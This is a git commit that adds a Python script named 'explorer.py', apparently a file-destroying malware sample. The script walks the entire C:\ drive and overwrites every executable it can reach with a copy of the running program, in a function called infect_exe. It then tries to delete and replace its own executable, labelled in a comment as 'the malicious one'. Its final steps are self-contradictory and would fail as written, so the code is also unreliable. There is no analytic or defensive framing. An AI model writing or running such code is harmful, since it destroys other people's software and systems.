89e81cceda703ab949d11241c2ebf4a3157e4b59
dartzfork <dartzcvm@proton.me>
2025-04-15 17:07:06 +0200

    Create explorer.py

---
+++ explorer.py
@@ -0,0 +1,30 @@
+import os
+import random
+import string
+import sys
+import shutil
+
+def generate_random_string(length):
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(length))
+
+def infect_exe(file_path, executable_path):
+    try:
+        shutil.copy(executable_path, file_path)
+    except (PermissionError, FileNotFoundError, IOError) as e:
+        print(f"Skipping file {file_path}: {e}")
+
+def main():
+    executable_path = sys.executable
+    for root, dirs, files in os.walk('C:\\'):
+        for file in files:
+            if file.endswith('.exe'):
+                file_path = os.path.join(root, file)
+                infect_exe(file_path, executable_path)
+
+    # Replace the current executable with the malicious one
+    os.remove(sys.executable)
+    os.rename(executable_path, sys.executable)
+
+if __name__ == '__main__':
+    main()
